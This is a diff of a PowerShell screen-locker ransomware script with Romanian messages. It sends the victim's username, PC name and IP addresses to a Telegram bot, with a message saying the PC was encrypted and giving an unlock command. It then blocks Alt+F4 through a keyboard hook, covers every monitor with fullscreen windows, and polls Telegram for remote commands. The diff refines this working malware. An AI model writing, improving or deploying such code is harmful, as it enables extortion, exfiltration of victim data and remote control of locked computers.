@@ -20,17 +20,18 @@ function Send-Telegram-Message {
 
     try { $ipPublic = (Invoke-RestMethod "https://api.ipify.org") } catch { $ipPublic = "n/a" }
 
-    $message = "PC-ul $user ($pc) a fost criptat cu succes.nIP: $ipLocal | $ipPublicnnUnlock it: $unlockCommand"
+    $message = "PC-ul $user ($pc) a fost criptat cu succes.`nIP: $ipLocal | $ipPublic`n`nUnlock it: $unlockCommand"
     $body = @{ chat_id = $chatID; text = $message } | ConvertTo-Json -Compress
     Invoke-RestMethod "https://api.telegram.org/bot$botToken/sendMessage" -Method POST -Body $body -ContentType 'application/json'
 }
 
 Send-Telegram-Message
 
-# IMPROVED LOW-LEVEL KEYBOARD HOOK CLASS (Blocks ALT+F4, ALT, Win, Tab, Esc)
+# KEYBOARD BLOCKER - ONLY Blocks Alt+F4 (reliable)
 Add-Type @"
 using System;
 using System.Runtime.InteropServices;
+using System.Windows.Forms;
 
 public class KeyBlocker {
     private static IntPtr hookId = IntPtr.Zero;
@@ -66,23 +67,13 @@ public class KeyBlocker {
     private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam) {
         if (nCode >= 0) {
             int vkCode = Marshal.ReadInt32(lParam);
-
             if (wParam == (IntPtr)WM_KEYDOWN || wParam == (IntPtr)WM_SYSKEYDOWN) {
-                if (vkCode == 0x43) Environment.Exit(0); // C key closes app
-
-                if (vkCode == 0x12) altPressed = true; // ALT pressed
-
-                // Explicitly block Alt+F4
-                if (altPressed && vkCode == 0x73)
-                    return (IntPtr)1;
-
-                // Block Windows keys, ALT, Tab, Esc individually
-                if (vkCode == 0x09 || vkCode == 0x1B || vkCode == 0x5B || vkCode == 0x5C || vkCode == 0x12)
-                    return (IntPtr)1;
+                if (vkCode == 0x12) altPressed = true; // ALT
+                if (vkCode == 0x73 && altPressed) return (IntPtr)1; // ALT+F4
+                if (vkCode == 0x43) Environment.Exit(0); // C key = Close
             }
-
             if (wParam == (IntPtr)WM_KEYUP || wParam == (IntPtr)WM_SYSKEYUP) {
-                if (vkCode == 0x12) altPressed = false; // ALT released
+                if (vkCode == 0x12) altPressed = false;
             }
         }
         return CallNextHookEx(hookId, nCode, wParam, lParam);
@@ -94,7 +85,6 @@ public class KeyBlocker {
 
 # FULLSCREEN ON ALL MONITORS
 Add-Type -AssemblyName System.Windows.Forms,System.Drawing
-
 $forms = foreach ($screen in [System.Windows.Forms.Screen]::AllScreens) {
     $form = New-Object Windows.Forms.Form -Property @{
         FormBorderStyle = 'None'
@@ -119,7 +109,7 @@ $forms = foreach ($screen in [System.Windows.Forms.Screen]::AllScreens) {
     $form
 }
 
-# TELEGRAM LISTENER WITH TIMER (Stable offset)
+# TELEGRAM LISTENER
 $offset = 0
 try {
     $initialUpdates = Invoke-RestMethod "https://api.telegram.org/bot$botToken/getUpdates" -UseBasicParsing -TimeoutSec 5
@@ -129,7 +119,7 @@ try {
 } catch { }
 
 $timer = New-Object System.Windows.Forms.Timer
-$timer.Interval = 5000 # check every 5 seconds
+$timer.Interval = 5000
 $timer.Add_Tick({
     try {
         $url = "https://api.telegram.org/bot$botToken/getUpdates?offset=$offset"
@@ -144,9 +134,9 @@ $timer.Add_Tick({
 })
 $timer.Start()
 
-# START APP LOOP
+# APP LOOP
 [System.Windows.Forms.Application]::Run()
 
-# CLEANUP ON EXIT
+# CLEANUP
 $timer.Stop()
 [KeyBlocker]::Unblock()
